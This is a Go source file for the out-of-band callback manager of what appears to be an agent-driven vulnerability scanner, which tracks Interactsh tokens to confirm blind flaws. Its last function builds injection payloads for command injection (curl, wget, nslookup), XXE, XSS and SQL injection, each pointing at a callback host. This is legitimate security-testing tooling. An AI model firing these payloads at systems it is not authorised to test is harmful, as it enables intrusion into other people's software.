// Package agent provides the Out-of-Band (OOB) interaction manager.
// This integrates with Project Discovery's Interactsh to detect blind
// vulnerabilities (SSRF, RCE, XXE, XSS) via DNS/HTTP/SMTP callbacks.
//
// Architecture:
//
//	Specialist Agent → oob.Register(scanID, token) → sends payload with token
//	... target makes OOB request ...
//	OOB Poller → oob.Poll() → matches callback to registered token
//	→ Agent receives confirmation → Finding marked as VALIDATED
package agent

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
	"sync"
	"time"
)

// OOBInteraction represents a captured out-of-band callback.
type OOBInteraction struct {
	ID        string    `json:"id"`
	Token     string    `json:"token"`
	Type      string    `json:"type"` // "dns", "http", "smtp"
	RemoteIP  string    `json:"remote_ip"`
	Timestamp time.Time `json:"timestamp"`
	RawData   string    `json:"raw_data"`
	// Metadata from the original registration
	ScanID    string `json:"scan_id"`
	VulnType  string `json:"vuln_type"`
	TargetURL string `json:"target_url"`
	Parameter string `json:"parameter"`
}

// OOBRegistration tracks a pending OOB token awaiting callback.
type OOBRegistration struct {
	Token     string    `json:"token"`
	ScanID    string    `json:"scan_id"`
	VulnType  string    `json:"vuln_type"`
	TargetURL string    `json:"target_url"`
	Parameter string    `json:"parameter"`
	CreatedAt time.Time `json:"created_at"`
	ExpiresAt time.Time `json:"expires_at"`
}

// OOBManager handles token generation, registration, and callback matching.
type OOBManager struct {
	mu sync.RWMutex

	// registrations maps token → registration metadata
	registrations map[string]*OOBRegistration

	// interactions stores confirmed callbacks
	interactions []*OOBInteraction

	// serverURL is the Interactsh server URL
	serverURL string

	// domain suffix for callback URLs
	domain string

	// tokenTTL is how long tokens remain valid
	tokenTTL time.Duration
}

// NewOOBManager creates a new OOB manager.
func NewOOBManager(serverURL string) *OOBManager {
	domain := "oast.live" // Default Interactsh domain
	if serverURL != "" {
		// Extract domain from URL
		parts := strings.Split(strings.TrimPrefix(strings.TrimPrefix(serverURL, "https://"), "http://"), "/")
		if len(parts) > 0 {
			domain = parts[0]
		}
	}

	return &OOBManager{
		registrations: make(map[string]*OOBRegistration),
		serverURL:     serverURL,
		domain:        domain,
		tokenTTL:      30 * time.Minute,
	}
}

// GenerateToken creates a unique token for OOB tracking.
func (m *OOBManager) GenerateToken() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// GenerateCallbackURL creates a full callback URL with embedded token.
func (m *OOBManager) GenerateCallbackURL(token string) string {
	return fmt.Sprintf("http://%s.%s", token, m.domain)
}

// GenerateDNSCallback creates a DNS callback hostname with embedded token.
func (m *OOBManager) GenerateDNSCallback(token string) string {
	return fmt.Sprintf("%s.%s", token, m.domain)
}

// Register tracks a new OOB token pending callback.
func (m *OOBManager) Register(token, scanID, vulnType, targetURL, parameter string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.registrations[token] = &OOBRegistration{
		Token:     token,
		ScanID:    scanID,
		VulnType:  vulnType,
		TargetURL: targetURL,
		Parameter: parameter,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(m.tokenTTL),
	}
}

// MatchInteraction checks if a callback matches a registered token
// and records the interaction.
func (m *OOBManager) MatchInteraction(token, interactionType, remoteIP, rawData string) *OOBInteraction {
	m.mu.Lock()
	defer m.mu.Unlock()

	reg, ok := m.registrations[token]
	if !ok {
		return nil
	}

	// Check expiry
	if time.Now().After(reg.ExpiresAt) {
		delete(m.registrations, token)
		return nil
	}

	interaction := &OOBInteraction{
		ID:        m.GenerateToken(), // Unique interaction ID
		Token:     token,
		Type:      interactionType,
		RemoteIP:  remoteIP,
		Timestamp: time.Now(),
		RawData:   rawData,
		ScanID:    reg.ScanID,
		VulnType:  reg.VulnType,
		TargetURL: reg.TargetURL,
		Parameter: reg.Parameter,
	}

	m.interactions = append(m.interactions, interaction)

	// Remove from pending (one-shot confirmation)
	delete(m.registrations, token)

	return interaction
}

// GetInteractions returns all confirmed OOB interactions for a scan.
func (m *OOBManager) GetInteractions(scanID string) []*OOBInteraction {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var result []*OOBInteraction
	for _, i := range m.interactions {
		if i.ScanID == scanID {
			result = append(result, i)
		}
	}
	return result
}

// GetInteractionsAny returns interactions as interface{} for cross-package interface compatibility.
func (m *OOBManager) GetInteractionsAny(scanID string) interface{} {
	return m.GetInteractions(scanID)
}

// PendingCount returns the number of tokens still awaiting callbacks.
func (m *OOBManager) PendingCount() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.registrations)
}

// Cleanup removes expired registrations.
func (m *OOBManager) Cleanup() int {
	m.mu.Lock()
	defer m.mu.Unlock()

	now := time.Now()
	removed := 0
	for token, reg := range m.registrations {
		if now.After(reg.ExpiresAt) {
			delete(m.registrations, token)
			removed++
		}
	}
	return removed
}

// Stats returns OOB system statistics.
func (m *OOBManager) Stats() map[string]interface{} {
	m.mu.RLock()
	defer m.mu.RUnlock()

	byType := make(map[string]int)
	for _, i := range m.interactions {
		byType[i.Type]++
	}

	return map[string]interface{}{
		"pending_tokens":       len(m.registrations),
		"total_interactions":   len(m.interactions),
		"interactions_by_type": byType,
		"server_url":           m.serverURL,
		"domain":               m.domain,
	}
}

// GeneratePayloads creates common OOB payload variants for a given token.
// Each specialist agent can use these as building blocks.
func (m *OOBManager) GeneratePayloads(token string) map[string]string {
	callback := m.GenerateCallbackURL(token)
	dns := m.GenerateDNSCallback(token)

	return map[string]string{
		// SSRF
		"ssrf_http": callback,
		"ssrf_dns":  fmt.Sprintf("http://%s", dns),

		// RCE (command injection with callback)
		"rce_curl":     fmt.Sprintf("curl %s", callback),
		"rce_wget":     fmt.Sprintf("wget %s", callback),
		"rce_nslookup": fmt.Sprintf("nslookup %s", dns),
		"rce_ping":     fmt.Sprintf("ping -c 1 %s", dns),

		// XXE
		"xxe_dtd":   fmt.Sprintf("<!ENTITY xxe SYSTEM \"%s\">", callback),
		"xxe_param": fmt.Sprintf("<!ENTITY %% xxe SYSTEM \"%s\">", callback),

		// XSS (blind/stored)
		"xss_img":   fmt.Sprintf("<img src=%s>", callback),
		"xss_fetch": fmt.Sprintf("<script>fetch('%s')</script>", callback),

		// SQLi OOB
		"sqli_mysql_oob":  fmt.Sprintf("LOAD_FILE('\\\\\\\\%s\\\\a')", dns),
		"sqli_mssql_oob":  fmt.Sprintf("EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'", dns),
		"sqli_oracle_oob": fmt.Sprintf("SELECT UTL_HTTP.REQUEST('%s') FROM DUAL", callback),
	}
}
